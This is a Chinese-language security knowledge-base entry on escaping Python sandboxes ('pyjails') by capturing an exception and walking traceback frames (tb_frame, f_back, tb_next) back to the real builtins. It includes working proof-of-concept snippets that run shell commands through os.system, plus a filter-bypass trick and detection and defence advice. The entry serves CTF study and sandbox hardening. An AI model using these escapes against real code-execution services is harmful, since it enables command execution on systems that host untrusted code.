---
id: binary-pwn-sandbox-escape-python-traceback-frame-escape
title: Python 沙箱：异常回溯 tb_frame 与 tb_next 链取帧逃逸
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: python-traceback-frame-escape
tags:
- python
- pyjail
- sandbox-escape
- cpython
- frame
- traceback
- builtins
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V10
  verified_at: '2026-11-05T01:20:15+08:00'
  notes: 已对照图 12/13 核对 __traceback__.tb_frame、f_back、tb_next 方向与命令执行；未验证点：未在本机复现，清理 __traceback__ 的沙箱不适用
url: /docs/binary/pwn/sandbox-escape/binary-pwn-sandbox-escape-python-traceback-frame-escape/
draft: false
kb_aliases:
- 异常回溯逃逸
- __traceback__ 栈帧
- tb_frame tb_next
- sys.exc_info 取帧
---

## 一句话结论

当沙箱禁止 `sys._getframe` 和生成器/协程属性、但允许写 `try/except` 时，抛出一个异常并从异常对象的 `__traceback__.tb_frame` 取到栈帧，再沿 `f_back`/`f_globals` 找回真实 `__builtins__`，即可导入 `os` 执行命令；嵌套调用还可用 `tb_next` 逐层深入。

## 原理

- Python 抛出异常时，解释器必须保留“案发现场”供调试/打印，因此会创建 traceback 对象，记录出错行号与当时的栈帧。异常对象通过 `__traceback__` 指向它。
- traceback 的 `tb_frame` 就是异常发生处（或捕获处依赖层级）的帧对象，等价于该层的 `sys._getframe()`；从它出发可用 `f_back` 回到调用者，`f_globals`/`f_locals`/`f_builtins` 与普通栈帧完全一致。
- `tb_next` 指向**更深一层**（被调用者）的 traceback，形成链表：捕获处的 `tb` 是外层，`tb.tb_next` 是实际抛错的内层。调用链深、或被包在 wrapper 中时，用它定位到持有敏感变量/模块的层。
- `sys.exc_info()` 返回 `(type, value, traceback)`，其 `[2]` 与 `e.__traceback__` 等价；若 `sys` 可用，可作为不依赖 `e` 变量的取法。
- 这条路只需要语言级的 `try/except` 与属性访问，不依赖 `sys` 模块、生成器或 `async def`，因此在 3.10/3.11+ 都可用；代价是 `__traceback__`、`tb_frame`、`f_back` 等属性名可能被源码黑名单拦截，需要用字符串拼接/`getattr` 绕过。

## 触发条件

- 目标允许执行用户 Python 代码，且 `try/except` 未被禁止；
- 沙箱只做源码字符串黑名单，或只删除了 `sys`/生成器相关入口，但没有清除异常对象的 `__traceback__`；
- 执行 globals 仍能在某一层取到真实 `__builtins__`（当前帧或 `f_back` 外层帧）；
- 属性名 `__traceback__`、`tb_frame`、`f_back`、`f_globals` 未被严格过滤，或可用拼接绕过。

## 利用步骤

1. 在受限代码中主动抛异常并用 `except Exception as e` 捕获。
2. 取 `e.__traceback__.tb_frame` 得到当前帧；必要时 `f_back` 回到外层。
3. 从 `f_globals['__builtins__']` 或 `f_builtins` 取真实 builtins，判断模块/dict 形态。
4. 调 `__import__('os')` 并执行命令。
5. 若当前层没有 os/builtins，用 `tb.tb_next` 向内层找，或继续 `f_back` 向外层找。

## PoC

```python
# 单行版：捕获后从 traceback 取帧，回到外层 globals
try:
    raise Exception
except Exception as e:
    e.__traceback__.tb_frame.f_back.f_globals['__builtins__'].__import__('os').system('whoami')
```

```python
# 嵌套异常：tb 为当前层，tb_next 为实际抛错的内层
import sys

def deep_error():
    1 / 0

def main():
    try:
        deep_error()
    except Exception:
        tb = sys.exc_info()[2]
        # tb.tb_frame.f_code.co_name -> main
        # tb.tb_next.tb_frame.f_code.co_name -> deep_error
        tb.tb_next.tb_frame.f_globals['__builtins__'].__import__('os').system('whoami')

main()
```

```python
# __builtins__ 为 dict 时
try:
    raise Exception
except Exception as e:
    bti = e.__traceback__.tb_frame.f_back.f_globals['__builtins__']
    bti['__import__']('os').system('id')
```

## 变体与关联

- 变体：`e.__traceback__.tb_frame.f_back` 层数按调用深度调整；`tb_next` 与 `f_back` 方向相反，分别用于“向内层/向外层”定位。
- 变体：`f_builtins` 直接取内置函数，绕过 `f_globals['__builtins__']` 被置空的情况（前提是当前帧的 builtins 仍真实）。
- 变体：属性名被过滤时用 `getattr` + 字符串拼接（`'_'*2+'traceback'+'_'*2`）。
- 关联：[[binary-pwn-sandbox-escape-python-generator-frame-builtins-recovery]]（生成器 gi_frame 回溯；本文补充异常回溯路径与 tb_next 方向）；[[binary-pwn-sandbox-escape-python-coroutine-cr-frame]]（协程 cr_frame，另一条不依赖 f_back 的路径）。
- 注意：若沙箱在异常处理时清空 `__traceback__` 或使用受限解释器，本路径失效。

## 检测与防御

- 检测：用户代码中出现 `__traceback__`、`tb_frame`、`tb_next`、`sys.exc_info`、`f_back`、`f_globals` 等组合，尤其是与 `raise`/`except` 同现。
- 检测：异常处理后紧接 `__import__`、`system`、`popen`、文件读取等危险调用。
- 防御：不要把 `exec`/`eval` 当沙箱；不可信代码必须放入独立进程/容器，低权限、只读文件系统、无网络、seccomp。
- 防御：若必须做 Python 层限制，使用 AST 白名单，禁止 `Try`/`Attribute`/`Subscript` 等语法，并在执行 globals 中彻底清空 `__builtins__`、切断外层帧回溯；仅过滤字符串属性名不足以阻止帧对象访问。
